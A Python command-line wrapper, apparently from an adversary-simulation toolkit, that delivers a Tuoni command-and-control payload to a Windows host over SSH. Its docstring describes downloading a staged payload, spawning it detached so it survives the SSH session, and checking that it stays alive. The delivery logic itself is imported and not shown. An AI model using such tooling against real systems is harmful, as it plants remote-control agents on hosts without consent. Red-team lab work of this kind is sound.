#!/usr/bin/env python3
"""Payload delivery over SSH — the Windows-target half of a foothold, nothing else.

The caller (Tuoni-API side) mints the listener + payload and hands this script the
staged URL that manage.py printed. This SSHes to the target, downloads the payload, spawns it detached from the OpenSSH job object, and checks the process
survived. It NEVER talks to the Tuoni API and NEVER kills anything — delivery and
C2 orchestration stay in separate scripts.

Does NOT (the caller's job, over the API): resolve/create the listener or payload,
wait for a beacon, run whoami, or cleanup.

Exit 0 = payload downloaded, passed a PE check, spawned, and the process survived
the SSH session close. That is NOT proof the agent beaconed — verify the callback
over the Tuoni API before any cleanup.

Flags (env fallback shown in --help): --staged-url/--target/--exec-user/
--exec-pass required; --settle optional.

Importable from a notebook: tuoni_deliver() takes the same inputs as the CLI
flags as keyword arguments and returns {"pid":, "alive":, "staged_url":}
instead of only printing. It raises TuoniScriptError on failure — argparse
and sys.exit live only in main(); the core logic is in adsim.
"""
import argparse
import os
import sys

from adsim.tuoni.common import TuoniScriptError
from adsim.tuoni.deliver import (
    tuoni_deliver,
)


def _need(value, name, flag):
    if not value:
        raise TuoniScriptError(f"{name} not set (use {flag} or env {name})")
    return value


def parse_args():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--staged-url", default=os.environ.get("STAGED_URL"),
                    help="Staged payload URL from manage.py (default: env STAGED_URL)")
    ap.add_argument("--target", default=os.environ.get("TARGET_IP"),
                    help="Windows target IP (default: env TARGET_IP)")
    ap.add_argument("--exec-user", default=os.environ.get("EXEC_USER"),
                    help="SSH/execution user, bare name (default: env EXEC_USER)")
    ap.add_argument("--exec-pass", default=os.environ.get("EXEC_PASS"),
                    help="Password for EXEC_USER (default: env EXEC_PASS)")
    ap.add_argument("--settle", type=int, default=int(os.environ.get("SETTLE", "10")),
                    help="Seconds to wait before the liveness check (default: 10)")
    return ap.parse_args()


def main():
    args = parse_args()
    try:
        staged_url = _need(args.staged_url, "STAGED_URL", "--staged-url")
        target = _need(args.target, "TARGET_IP", "--target")
        exec_user = _need(args.exec_user, "EXEC_USER", "--exec-user")
        exec_pass = _need(args.exec_pass, "EXEC_PASS", "--exec-pass")
        result = tuoni_deliver(
            staged_url=staged_url, target=target,
            exec_user=exec_user, exec_pass=exec_pass, settle=args.settle,
        )
    except TuoniScriptError as e:
        sys.exit(str(e))

    if not result["alive"]:
        sys.exit(1)


if __name__ == "__main__":
    main()
